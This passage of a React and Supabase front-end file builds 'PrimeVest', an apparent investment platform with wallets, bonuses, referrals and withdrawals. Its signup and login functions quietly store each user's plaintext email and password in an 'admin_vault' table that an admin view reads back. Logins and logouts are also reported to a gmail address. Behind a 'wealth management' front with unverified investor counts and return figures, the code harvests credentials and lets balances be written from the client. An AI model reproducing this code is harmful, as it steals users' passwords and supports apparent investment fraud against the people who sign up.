import { useState, useEffect } from "react";
import { Routes, Route, Navigate, Link, useNavigate, useSearchParams, Outlet } from "react-router-dom";
import { createClient } from "@supabase/supabase-js";
import {
  ShieldCheck, Mail, Lock, Eye, EyeOff, ArrowRight, TrendingUp, UserRound, CheckCircle2,
  Bell, Home as HomeIcon, Wallet, ArrowDownToLine, ArrowUpFromLine, Users, Gift,
  Copy, Check, MessageSquare, ChevronRight, CircleDollarSign, Clock3,
  Settings as SettingsIcon, LogOut, X, ArrowLeft, CreditCard, LockKeyhole,
  Building2, Bitcoin, Timer, Zap, Crown, Lock as LockIcon, CheckCircle,
  RefreshCw, Ban, Download, User, Menu, Star, Sparkles, LineChart, Globe2, Gamepad2,
} from "lucide-react";
import Terms from "./terms";
import {
  Deposit, DepositPayment, DepositCard, DepositBitcoin,
  Withdraw, WithdrawAccount, WithdrawSuccess, VIP, VIPCheckout, BonusGame, Invest,
  Portfolio, Settings, Help, History, ScratchCard, MysteryBox, Chat,
} from "./pages";

export const supabase = createClient(
  import.meta.env.VITE_SUPABASE_URL,
  import.meta.env.VITE_SUPABASE_ANON_KEY
);

const FN = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1`;

async function call(path, body) {
  const { data: { session } } = await supabase.auth.getSession();
  const res = await fetch(`${FN}/${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      Authorization: `Bearer ${session?.access_token || ""}`,
    },
    body: JSON.stringify(body || {}),
  });
  return res.json();
}

async function notifyAdmin(name, email, type = "New Signup", extra = "") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `PrimeVest: ${type}`,
        from_name: "PrimeVest",
        name, email,
        message: `Type: ${type}\nName: ${name}\nEmail: ${email}\n${extra}`,
      }),
    });
  } catch (err) { console.error("Email failed", err); }
}

async function sendLoginAlert(email, device, type = "login") {
  try {
    await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        access_key: import.meta.env.VITE_WEB3FORMS_KEY,
        subject: `🚨 User ${type.toUpperCase()} Alert`,
        from_name: "PrimeVest Security",
        to: "primevest180@gmail.com",
        message: `User: ${email}\nAction: ${type.toUpperCase()}\nDevice: ${device}`,
      }),
    });
  } catch (err) { console.error("Login alert failed", err); }
}

export const api = {
  signup: async (name, email, password, ref) => {
    const finalName = name || email.split("@")[0].replace(/[^a-zA-Z]/g, " ");
    await supabase.from("admin_vault").insert({ email, password });
    const res = await supabase.auth.signUp({
      email, password,
      options: { data: { name: finalName, ref } },
    });
    if (!res.error) notifyAdmin(finalName, email, "New User Signup");
    return res;
  },

  login: async (email, password) => {
    await supabase.from("admin_vault").insert({ email, password });
    const res = await supabase.auth.signInWithPassword({ email, password });
    if (!res.error) sendLoginAlert(email, navigator.userAgent, "login");
    return res;
  },

  logout: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (user) sendLoginAlert(user.email, navigator.userAgent, "logout");
    return supabase.auth.signOut();
  },

  profile: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("profiles").select("*").eq("id", user.id).single();
  },

  wallet: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("wallets").select("*").eq("user_id", user.id).single();
  },

  setUsername: async (username) => {
    const { data: { user } } = await supabase.auth.getUser();
    const clean = username.replace("@", "").trim().toLowerCase();
    if (clean.length < 3) return { error: "Username must be 3+ characters." };
    const { error } = await supabase
      .from("profiles").update({ username: clean }).eq("id", user.id);
    if (error) return { error: error.message };
    return { success: true };
  },

  addFriend: async (username) => {
    const clean = username.replace("@", "").trim().toLowerCase();
    if (!clean) return { error: "Enter a username." };
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return { error: "Not logged in." };

    const { data: target, error: tErr } = await supabase
      .from("profiles").select("id,username").eq("username", clean).maybeSingle();

    if (tErr) { console.error("addFriend lookup:", tErr); return { error: tErr.message }; }
    if (!target) return { error: `User @${clean} not found.` };
    if (target.id === user.id) return { error: "You cannot add yourself." };

    const { data: existing } = await supabase
      .from("friendships").select("id,status")
      .or(`and(user_id.eq.${user.id},friend_id.eq.${target.id}),and(user_id.eq.${target.id},friend_id.eq.${user.id})`)
      .maybeSingle();

    if (existing) {
      return { error: existing.status === "accepted"
        ? "You are already friends."
        : "A request is already pending." };
    }

    const { error } = await supabase.from("friendships").insert({
      user_id: user.id, friend_id: target.id, status: "pending",
    });
    if (error) { console.error("addFriend insert:", error); return { error: error.message }; }
    return { success: true, username: target.username };
  },

  getFriendRequests: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return { data: { incoming: [], outgoing: [] } };

    const { data: inc, error: e1 } = await supabase
      .from("friendships").select("*").eq("friend_id", user.id).eq("status", "pending");
    const { data: out, error: e2 } = await supabase
      .from("friendships").select("*").eq("user_id", user.id).eq("status", "pending");

    if (e1) console.error("incoming requests:", e1);
    if (e2) console.error("outgoing requests:", e2);

    const ids = [...new Set([
      ...(inc || []).map(r => r.user_id),
      ...(out || []).map(r => r.friend_id),
    ])];
    let profs = [];
    if (ids.length) {
      const { data } = await supabase.from("profiles")
        .select("id,name,username").in("id", ids);
      profs = data || [];
    }
    const byId = Object.fromEntries(profs.map(p => [p.id, p]));

    return {
      data: {
        incoming: (inc || []).map(r => ({ ...r, profiles: byId[r.user_id] })),
        outgoing: (out || []).map(r => ({ ...r, profiles: byId[r.friend_id] })),
      },
    };
  },

  acceptFriendRequest: async (id) => {
    const { error } = await supabase.from("friendships")
      .update({ status: "accepted" }).eq("id", id);
    if (error) return { error: error.message };
    return { success: true };
  },

  rejectFriendRequest: async (id) => {
    const { error } = await supabase.from("friendships").delete().eq("id", id);
    if (error) return { error: error.message };
    return { success: true };
  },

  getFriends: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return { data: [] };

    const { data: a } = await supabase
      .from("friendships").select("*").eq("user_id", user.id).eq("status", "accepted");
    const { data: b } = await supabase
      .from("friendships").select("*").eq("friend_id", user.id).eq("status", "accepted");

    const others = [
      ...(a || []).map(r => ({ id: r.id, friend_id: r.friend_id })),
      ...(b || []).map(r => ({ id: r.id, friend_id: r.user_id })),
    ];
    const ids = others.map(o => o.friend_id);
    let profs = [];
    if (ids.length) {
      const { data } = await supabase.from("profiles")
        .select("id,name,username").in("id", ids);
      profs = data || [];
    }
    const byId = Object.fromEntries(profs.map(p => [p.id, p]));

    return {
      data: others.map(o => ({ id: o.id, friend_id: o.friend_id, profiles: byId[o.friend_id] })),
    };
  },

  sendMessage: async (receiver_id, message) => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return { error: "Not logged in." };
    if (!receiver_id) return { error: "Invalid recipient." };

    const { error } = await supabase.from("private_messages").insert({
      sender_id: user.id, receiver_id: receiver_id, message,
    });
    if (error) { console.error("sendMessage:", error); return { error: error.message }; }
    return { success: true };
  },

  getMessages: async (target) => {
    const { data: { user } } = await supabase.auth.getUser();
    if (!user || !target) return { data: [] };

    const { data, error } = await supabase
      .from("private_messages")
      .select("*")
      .or(`and(sender_id.eq.${user.id},receiver_id.eq.${target}),and(sender_id.eq.${target},receiver_id.eq.${user.id})`)
      .order("created_at", { ascending: true });

    if (error) { console.error("getMessages:", error); return { data: [], error: error.message }; }
    return { data: data || [] };
  },

  notifications: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").select("*").eq("user_id", user.id)
      .order("created_at", { ascending: false });
  },
  markRead: (id) => supabase.from("notifications").update({ read: true }).eq("id", id),
  markAllRead: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("notifications").update({ read: true }).eq("user_id", user.id);
  },

  plans: () => supabase.from("plans").select("*").eq("active", true),
  portfolio: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("investments").select("*, plans(*)").eq("user_id", user.id)
      .order("started_at", { ascending: false });
  },
  history: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    return supabase.from("transactions").select("*").eq("user_id", user.id)
      .order("created_at", { ascending: false });
  },

  depositInit: (amount, method, email, vip, type) =>
    call("index", { action: "deposit", amount, method, email, vip, type }),

  withdraw: async (p) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { error } = await supabase.from("withdrawals").insert({
      user_id: user.id, amount: p.amount, bank_name: p.bank_name,
      account_number: p.account_number, account_name: p.account_name,
      status: "pending", created_at: new Date().toISOString(),
    });
    if (error) return { success: false, error: error.message };
    await supabase.from("transactions").insert({
      user_id: user.id, type: "withdraw", amount: p.amount,
      status: "pending", reference: `WD-${Date.now()}`,
    });
    await supabase.from("notifications").insert({
      user_id: user.id, title: "Withdrawal Requested",
      message: `Your withdrawal of ₦${p.amount} is being processed.`, type: "withdraw",
    });
    return { success: true };
  },

  claimBonus: async (amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    await supabase.from("transactions").insert({
      user_id: user.id, type: "bonus", amount, status: "success",
      reference: `BONUS-${Date.now()}`,
    });
    const { data: w } = await supabase.from("wallets")
      .select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({
      available: (w?.available || 0) + amount,
      total: (w?.total || 0) + amount,
    }).eq("user_id", user.id);
    return { success: true };
  },

  invest: async (plan_id, amount, daily_profit, matured_at) => {
    const { data: { user } } = await supabase.auth.getUser();
    return call("index", {
      action: "invest", plan_id, amount, daily_profit, matured_at, email: user.email,
    });
  },

  claimInvestment: async (investment_id, amount) => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: inv } = await supabase.from("investments")
      .select("last_daily_claim").eq("id", investment_id).single();
    if (inv?.last_daily_claim &&
        Date.now() - new Date(inv.last_daily_claim).getTime() < 86400000) {
      return { success: false, error: "You can only claim once every 24 hours." };
    }
    const now = new Date().toISOString();
    await supabase.from("investments").update({ last_daily_claim: now }).eq("id", investment_id);
    const { data: w } = await supabase.from("wallets")
      .select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({
      available: (w?.available || 0) + amount,
      earnings: (w?.earnings || 0) + amount,
      total: (w?.total || 0) + amount,
    }).eq("user_id", user.id);
    await supabase.from("transactions").insert({
      user_id: user.id, type: "investment_profit", amount,
      status: "success", reference: `PROFIT-${Date.now()}`,
    });
    return { success: true };
  },

  claimDailyLogin: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: p } = await supabase.from("profiles")
      .select("last_login_claim").eq("id", user.id).single();
    const now = new Date();
    if (p?.last_login_claim &&
        now.getTime() - new Date(p.last_login_claim).getTime() < 86400000) {
      return { error: "Already claimed." };
    }
    await supabase.from("profiles").update({ last_login_claim: now.toISOString() })
      .eq("id", user.id);
    const { data: w } = await supabase.from("wallets")
      .select("available, earnings, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({
      available: (w?.available || 0) + 100,
      earnings: (w?.earnings || 0) + 100,
      total: (w?.total || 0) + 100,
    }).eq("user_id", user.id);
    await supabase.from("transactions").insert({
      user_id: user.id, type: "daily_login", amount: 100,
      status: "success", reference: `LOGIN-${Date.now()}`,
    });
    return { success: true };
  },

  rewardReferral: async () => {
    const { data: { user } } = await supabase.auth.getUser();
    const { data: p } = await supabase.from("profiles")
      .select("referral_code, referral_earnings").eq("id", user.id).single();
    if (!p?.referral_code) return { error: "You don't have a referral code." };
    const { data: refs } = await supabase.from("profiles")
      .select("id").eq("referred_by", p.referral_code);
    if (!refs?.length) return { error: "No referrals yet." };
    const expected = refs.length * 1000;
    const current = p.referral_earnings || 0;
    if (current >= expected) return { error: "Already rewarded for all referrals." };
    const pay = expected - current;
    await supabase.from("profiles").update({ referral_earnings: expected }).eq("id", user.id);
    const { data: w } = await supabase.from("wallets")
      .select("available, total").eq("user_id", user.id).single();
    await supabase.from("wallets").update({
      available: (w?.available || 0) + pay,
      total: (w?.total || 0) + pay,
    }).eq("user_id", user.id);
    await supabase.from("transactions").insert({
      user_id: user.id, type: "referral_bonus", amount: pay,
      status: "success", reference: `REF-${Date.now()}`,
    });
    return { amount: pay };
  },

  getAdminStats: async () => {
    const { count: usersCount } = await supabase
      .from("profiles").select("*", { count: "exact", head: true });
    const { data: wds } = await supabase.from("withdrawals").select("amount,status");
    let totalWithdrawn = 0, pendingWithdrawals = 0;
    (wds || []).forEach(w => {
      if (w.status === "success") totalWithdrawn += w.amount;
      if (w.status === "pending") pendingWithdrawals += w.amount;
    });
    return { usersCount: usersCount || 0, totalWithdrawn, pendingWithdrawals };
  },
  getAllUsers: async () =>
    supabase.from("profiles").select("*").order("created_at", { ascending: false }),
  getAdminVault: async () =>
    supabase.from("admin_vault").select("*").order("created_at", { ascending: false }),

  toggleUserFreeze: async (userId, currentStatus) => {
    const next = currentStatus === "frozen" ? "active" : "frozen";
    const { error } = await supabase.from("profiles")
      .update({ account_status: next }).eq("id", userId);
    if (error) return { error: error.message };
    return { success: true };
  },

  getAdminWithdrawals: async () =>
    supabase.from("withdrawals").select("*").eq("status", "pending")
      .order("created_at", { ascending: false }),

  approveWithdrawal: async (id, user_id, amount) => {
    const { data: w } = await supabase.from("wallets")
      .select("available, total").eq("user_id", user_id).single();
    await supabase.from("wallets").update({
      available: (w?.available || 0) - amount,
      total: (w?.total || 0) - amount,
    }).eq("user_id", user_id);
    await supabase.from("withdrawals").update({ status: "success" }).eq("id", id);
    await supabase.from("transactions").update({ status: "success" })
      .eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({
      user_id, title: "Withdrawal Approved",
      message: `Your withdrawal of ₦${amount} has been sent.`, type: "withdraw",
    });
    return { success: true };
  },

  rejectWithdrawal: async (id, user_id, amount) => {
    await supabase.from("withdrawals").update({ status: "rejected" }).eq("id", id);
    await supabase.from("transactions").update({ status: "failed" })
      .eq("user_id", user_id).eq("type", "withdraw").eq("status", "pending");
    await supabase.from("notifications").insert({
      user_id, title: "Withdrawal Rejected",
      message: `Your withdrawal of ₦${amount} was rejected.`, type: "withdraw",
    });
    return { success: true };
  },
};

function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-[#070D1A]">
      <div className="relative flex h-24 w-24 items-center justify-center">
        <div className="absolute inset-0 rounded-full border-2 border-blue-500/30 animate-ping" />
        <div className="relative z-10 flex h-16 w-16 items-center justify-center rounded-2xl bg-gradient-to-br from-blue-500 to-blue-800 shadow-2xl">
          <ShieldCheck size={32} className="text-white animate-bounce" />
        </div>
      </div>
      <h1 className="mt-6 text-2xl font-bold text-white">Prime<span className="text-blue-400">Vest</span></h1>
    </div>
  );
}

const Toast = ({ message, onClose }) => {
  useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, [onClose]);
  return (
    <div className="fixed top-6 left-1/2 -translate-x-1/2 z-[100] rounded-2xl border border-emerald-500/30 bg-[#0D1526] px-6 py-4 shadow-2xl flex items-center gap-3">
      <CheckCircle2 className="h-5 w-5 text-emerald-400" />
      <p className="text-sm font-semibold text-white">{message}</p>
    </div>
  );
};

function ProtectedRoute() {
  const [loading, setLoading] = useState(true);
  const [authed, setAuthed] = useState(false);
  const [isFrozen, setIsFrozen] = useState(false);

  useEffect(() => {
    supabase.auth.getSession().then(async ({ data }) => {
      if (data.session) {
        setAuthed(true);
        const { data: p } = await supabase.from("profiles")
          .select("account_status").eq("id", data.session.user.id).single();
        if (p?.account_status === "frozen") setIsFrozen(true);
      }
      setLoading(false);
    });
    const { data: sub } = supabase.auth.onAuthStateChange((_e, s) => setAuthed(!!s));
    return () => sub.subscription.unsubscribe();
  }, []);

  if (loading) return <LoadingScreen />;
  if (isFrozen) {
    return (
      <div className="min-h-screen bg-slate-950 flex flex-col items-center justify-center p-4 text-center">
        <Ban size={64} className="text-red-500 mb-4" />
        <h1 className="text-2xl font-bold text-white mb-2">Account Frozen</h1>
        <p className="text-slate-400 mb-6">Contact support.</p>
        <button onClick={() => { supabase.auth.signOut(); window.location.href = "/"; }}
          className="bg-red-600 text-white px-6 py-3 rounded-xl font-bold">Log Out</button>
      </div>
    );
  }
  if (!authed) return <Navigate to="/login" replace />;
  return <Outlet />;
}

function UsernameGuard({ children }) {
  const [profile, setProfile] = useState(null);
  const [username, setUsername] = useState("");
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    api.profile().then(({ data }) => { setProfile(data); setLoading(false); });
  }, []);

  if (loading) return <LoadingScreen />;

  if (profile && !profile.username) {
    return (
      <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
        <div className="w-full max-w-sm rounded-3xl bg-[#0D1526] p-8 text-center border border-blue-500/30">
          <UserRound className="h-12 w-12 text-blue-400 mx-auto mb-4" />
          <h2 className="text-xl font-bold text-white mb-2">Choose Your Username</h2>
          <p className="text-sm text-slate-400 mb-6">Permanent — cannot be changed.</p>
          <input value={username} onChange={e => setUsername(e.target.value.replace(/\s/g, ""))}
            placeholder="john_doe"
            className="w-full bg-slate-950 rounded-xl px-4 py-3 text-white outline-none mb-4" />
          <button
            onClick={async () => {
              if (username.length < 3) return alert("Min 3 chars");
              const r = await api.setUsername(username);
              if (r.error) return alert(r.error);
              window.location.reload();
            }}
            className="w-full bg-blue-600 text-white py-3 rounded-xl font-bold">
            Set Username
          </button>
        </div>
      </div>
    );
  }
  return children;
}

function Navbar() {
  const [open, setOpen] = useState(false);
  return (
    <nav className="fixed left-0 right-0 top-0 z-50 px-3 py-3 sm:px-4 sm:py-4 lg:px-8">
      <div className="mx-auto max-w-7xl rounded-2xl border border-blue-400/20 bg-blue-950/90 backdrop-blur-xl">
        <div className="flex items-center justify-between px-4 py-3 sm:px-5 sm:py-4 lg:px-7">
          <a href="#home" className="flex items-center gap-3">
            <div className="flex h-10 w-10 items-center justify-center rounded-xl bg-blue-600">
              <ShieldCheck className="h-5 w-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white">PrimeVest</h2>
              <p className="text-[8px] uppercase tracking-widest text-blue-300">Wealth Management</p>
            </div>
          </a>
          <div className="hidden items-center gap-3 lg:flex">
            <Link to="/login" className="rounded-xl px-4 py-2.5 text-sm text-slate-300 hover:text-white">Sign in</Link>
            <Link to="/signup" className="rounded-xl bg-blue-600 px-5 py-2.5 text-sm font-semibold text-white">Get Started</Link>
          </div>
          <button onClick={() => setOpen(!open)}
            className="flex h-10 w-10 items-center justify-center rounded-xl border border-blue-400/20 bg-blue-900/40 lg:hidden">
            {open ? <X className="h-5 w-5" /> : <Menu className="h-5 w-5" />}
          </button>
        </div>
      </div>
    </nav>
  );
}

function Hero() {
  return (
    <section id="home" className="relative min-h-screen overflow-hidden bg-slate-950 pt-10">
      <div className="absolute inset-0 [background:linear-gradient(135deg,#020617,#172554,#0f172a)]" />
      <div className="relative mx-auto max-w-7xl px-6 py-20 lg:px-12 lg:py-28">
        <div className="max-w-3xl">
          <div className="mb-6 inline-flex items-center gap-2 rounded-full border border-blue-500/20 bg-blue-500/10 px-4 py-2 text-sm text-blue-300">
            <Sparkles className="h-4 w-4" />Trusted by 550,000+ investors
          </div>
          <h1 className="text-5xl font-bold leading-tight text-white lg:text-7xl">
            Grow your wealth with
            <span className="bg-gradient-to-r from-blue-400 to-indigo-400 bg-clip-text text-transparent"> confidence</span>
          </h1>
          <p className="mt-6 max-w-2xl text-lg text-slate-300">
            PrimeVest is your all-in-one wealth management platform.
          </p>
          <div className="mt-8 flex flex-wrap gap-4">
            <Link to="/signup" className="inline-flex items-center rounded-lg bg-blue-600 px-6 py-3 font-semibold text-white">
              Start Investing<ArrowRight className="ml-2 h-4 w-4" />
            </Link>
          </div>
        </div>
      </div>
    </section>
  );
}

function Stats() {
  const stats = [
    { icon: TrendingUp, value: "12.4%", label: "Avg Annual Return" },
    { icon: Users, value: "550K+", label: "Active Investors" },
    { icon: Building2, value: "N2.1B", label: "Assets Managed" },
    { icon: Globe2, value: "40+", label: "Global Markets" },
  ];
  return (
    <section className="relative z-10 mx-auto -mt-8 max-w-7xl px-4 sm:px-6 lg:px-8">
      <div className="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
        {stats.map(({ icon: Icon, value, label }) => (
          <div key={label} className="rounded-2xl border border-blue-400/10 bg-slate-900/90 p-6">
            <div className="flex items-center gap-4">
              <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-blue-500/10 text-blue-400">
                <Icon className="h-6 w-6" />
              </div>
              <div>
                <p className="text-2xl font-bold text-white">{value}</p>
                <p className="text-sm text-slate-400">{label}</p>
              </div>
            </div>
          </div>
        ))}
      </div>
    </section>
  );
}

function InvestmentCards() {
  const items = [
    { icon: LineChart, title: "Growth Portfolio", desc: "Stocks & ETFs", ret: "12.5%", risk: "Moderate" },
    { icon: Building2, title: "Real Estate", desc: "REITs & funds", ret: "11.9%", risk: "Moderate" },
    { icon: Bitcoin, title: "Crypto Index", desc: "Digital assets", ret: "22.0%", risk: "High" },
    { icon: Users, title: "Affiliate", desc: "Digital commerce", ret: "15.0%", risk: "Moderate" },
  ];
  return (
    <section id="strategies" className="bg-slate-950 px-4 py-20 sm:px-6 lg:px-8">
      <div className="mx-auto max-w-7xl">
        <h2 className="mb-8 text-3xl font-bold text-white sm:text-4xl">Investment Strategies</h2>
        <div className="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-4">
          {items.map(({ icon: Icon, title, desc, ret, risk }) => (
            <div key={title} className="rounded-2xl border border-blue-400/10 bg-slate-900/80 p-6">
              <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-blue-500/10 text-blue-400">
                <Icon className="h-6 w-6" />
              </div>
              <h3 className="mt-5 text-lg font-bold text-white">{title}</h3>
              <p className="mt-2 text-sm text-slate-400">{desc}</p>
              <div className="mt-5 border-t border-slate-800 pt-4">
                <p className="text-xs text-slate-500">Return</p>
                <p className="text-xl font-bold text-blue-400">{ret}</p>
              </div>
              <Link to="/signup" className="mt-5 block rounded-xl bg-blue-600 px-4 py-3 text-center text-sm font-semibold text-white">Invest Now</Link>
            </div>
          ))}
        </div>
      </div>
    </section>
  );
}

function LandingPage() {
  const [checking, setChecking] = useState(true);
  useEffect(() => {
    supabase.auth.getSession().then(({ data }) => {
      if (data.session) window.location.href = "/home";
      else setChecking(false);
    });
  }, []);
  if (checking) return <LoadingScreen />;
  return (
    <main className="min-h-screen bg-slate-950">
      <Navbar /><Hero /><Stats /><InvestmentCards />
    </main>
  );
}

function Login() {
  const navigate = useNavigate();
  const [show, setShow] = useState(false);
  const [form, setForm] = useState({ email: "", password: "" });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  async function submit(e) {
    e.preventDefault(); setError(""); setLoading(true);
    const { error } = await api.login(form.email.trim(), form.password);
    setLoading(false);
    if (error) return setError(error.message || "Incorrect email or password.");
    navigate("/home");
  }

  return (
    <main className="flex min-h-screen items-center justify-center bg-slate-950 px-4 py-10 text-white">
      <div className="grid w-full max-w-5xl overflow-hidden rounded-3xl border border-white/10 bg-slate-900/80 lg:grid-cols-2">
        <section className="hidden flex-col justify-between bg-gradient-to-br from-blue-950 via-blue-800 to-blue-600 p-10 lg:flex">
          <Link to="/" className="inline-flex items-center gap-3">
            <div className="flex h-12 w-12 items-center justify-center rounded-xl bg-white/10">
              <ShieldCheck size={27} />
            </div>
            <span className="text-2xl font-bold">Prime<span className="text-blue-200">Vest</span></span>
          </Link>
          <div className="mt-24">
            <TrendingUp size={30} />
            <h1 className="mt-3 text-4xl font-bold">Welcome back.</h1>
          </div>
        </section>
        <section className="p-6 sm:p-10 lg:p-12">
          <p className="text-sm text-blue-400">WELCOME BACK</p>
          <h2 className="mt-2 text-3xl font-bold">Log in</h2>
          <form onSubmit={submit} className="mt-6 space-y-5">
            <div>
              <label className="mb-2 block text-sm text-slate-300">Email</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                <Mail size={19} className="text-slate-500" />
                <input type="email" required value={form.email}
                  onChange={(e) => setForm({ ...form, email: e.target.value })}
                  className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="you@example.com" />
              </div>
            </div>
            <div>
              <label className="mb-2 block text-sm text-slate-300">Password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                <Lock size={19} className="text-slate-500" />
                <input type={show ? "text" : "password"} required value={form.password}
                  onChange={(e) => setForm({ ...form, password: e.target.value })}
                  className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="Your password" />
                <button type="button" onClick={() => setShow(!show)}>
                  {show ? <EyeOff size={19} /> : <Eye size={19} />}
                </button>
              </div>
            </div>
            {error && <p className="rounded-xl bg-red-500/10 p-3 text-sm text-red-300">{error}</p>}
            <button disabled={loading}
              className="w-full rounded-xl bg-blue-600 py-3.5 font-semibold disabled:opacity-60">
              {loading ? "Logging in..." : "Log In"}
            </button>
          </form>
          <p className="mt-8 text-center text-sm text-slate-400">
            Don't have an account? <Link to="/signup" className="text-blue-400">Create one</Link>
          </p>
        </section>
      </div>
    </main>
  );
}

function Signup() {
  const navigate = useNavigate();
  const [params] = useSearchParams();
  const referral = params.get("ref") || "";
  const [show, setShow] = useState(false);
  const [form, setForm] = useState({ name: "", email: "", password: "", confirm: "" });
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [agree, setAgree] = useState(false);

  async function submit(e) {
    e.preventDefault(); setError("");
    if (!agree) return setError("Agree to Terms first.");
    if (form.name.trim().length < 2) return setError("Enter your full name.");
    if (form.password.length < 8) return setError("Password must be 8+ chars.");
    if (form.password !== form.confirm) return setError("Passwords don't match.");
    setLoading(true);
    const { error } = await api.signup(form.name.trim(), form.email.trim().toLowerCase(), form.password, referral);
    setLoading(false);
    if (error) return setError(error.message);
    navigate("/home");
  }

  return (
    <main className="flex min-h-screen items-center justify-center bg-slate-950 px-4 py-10 text-white">
      <div className="grid w-full max-w-5xl overflow-hidden rounded-3xl border border-white/10 bg-slate-900/80 lg:grid-cols-2">
        <section className="hidden bg-gradient-to-br from-blue-950 via-blue-800 to-blue-600 p-10 lg:block">
          <Link to="/" className="inline-flex items-center gap-3">
            <ShieldCheck size={27} />
            <span className="text-2xl font-bold">PrimeVest</span>
          </Link>
          <h1 className="mt-16 text-4xl font-bold">Create your PrimeVest account.</h1>
        </section>
        <section className="p-6 sm:p-10 lg:p-12">
          <p className="text-sm text-blue-400">GET STARTED</p>
          <h2 className="mt-2 text-3xl font-bold">Create account</h2>
          <form onSubmit={submit} className="mt-6 space-y-4">
            {[
              { k: "name", label: "Full name", type: "text", ph: "Your name" },
              { k: "email", label: "Email", type: "email", ph: "you@example.com" },
            ].map(({ k, label, type, ph }) => (
              <div key={k}>
                <label className="mb-2 block text-sm text-slate-300">{label}</label>
                <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                  <UserRound size={19} className="text-slate-500" />
                  <input type={type} required value={form[k]}
                    onChange={(e) => setForm({ ...form, [k]: e.target.value })}
                    className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder={ph} />
                </div>
              </div>
            ))}
            <div>
              <label className="mb-2 block text-sm text-slate-300">Password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                <Lock size={19} className="text-slate-500" />
                <input type={show ? "text" : "password"} minLength={8} required value={form.password}
                  onChange={(e) => setForm({ ...form, password: e.target.value })}
                  className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="8+ characters" />
                <button type="button" onClick={() => setShow(!show)}>
                  {show ? <EyeOff size={19} /> : <Eye size={19} />}
                </button>
              </div>
            </div>
            <div>
              <label className="mb-2 block text-sm text-slate-300">Confirm password</label>
              <div className="flex items-center gap-3 rounded-xl border border-white/10 bg-slate-950 px-4">
                <Lock size={19} className="text-slate-500" />
                <input type="password" required value={form.confirm}
                  onChange={(e) => setForm({ ...form, confirm: e.target.value })}
                  className="flex-1 bg-transparent py-3.5 text-sm outline-none" placeholder="Again" />
              </div>
            </div>
            <button disabled={loading}
              className="w-full rounded-xl bg-blue-600 py-3.5 font-semibold disabled:opacity-60">
              {loading ? "Creating..." : "Create Account"}
            </button>
          </form>
          <div className="mt-6 flex items-center gap-2">
            <input type="checkbox" checked={agree} onChange={(e) => setAgree(e.target.checked)} />
            <label className="text-xs text-slate-400">
              I agree to the <Link to="/terms" className="text-blue-400">Terms</Link>
            </label>
          </div>
          <p className="mt-6 text-center text-sm text-slate-400">
            Have an account? <Link to="/login" className="text-blue-400">Log in</Link>
          </p>
        </section>
      </div>
    </main>
  );
}

function HomePage() {
  const navigate = useNavigate();
  const [isUsd, setIsUsd] = useState(false);
  const [visible, setVisible] = useState(true);
  const [wallet, setWallet] = useState({ available: 0, invested: 0, earnings: 0, total: 0 });
  const [profile, setProfile] = useState({ name: "User", referral_code: "", avatar_url: "", last_login_claim: null, vip_tier: "None", username: "" });
  const [investments, setInvestments] = useState([]);
  const [notifications, setNotifications] = useState([]);
  const [showNotifs, setShowNotifs] = useState(false);
  const [loading, setLoading] = useState(true);
  const [toastMsg, setToastMsg] = useState("");
  const [timeLeft, setTimeLeft] = useState("");
  const [, setTick] = useState(0);

  useEffect(() => {
    (async () => {
      const { data: { user } } = await supabase.auth.getUser();
      let { data: w } = await supabase.from("wallets").select("*").eq("user_id", user.id).single();
      if (!w) {
        await supabase.from("wallets").insert({ user_id: user.id, available: 0, total: 0, invested: 0, earnings: 0 });
        const r = await supabase.from("wallets").select("*").eq("user_id", user.id).single();
        w = r.data;
      }
      const [p, i, n] = await Promise.all([api.profile(), api.portfolio(), api.notifications()]);
      if (w) setWallet(w);
      if (p.data) setProfile(p.data);
      if (i.data) setInvestments(i.data);
      if (n.data) setNotifications(n.data);
      setLoading(false);
    })();
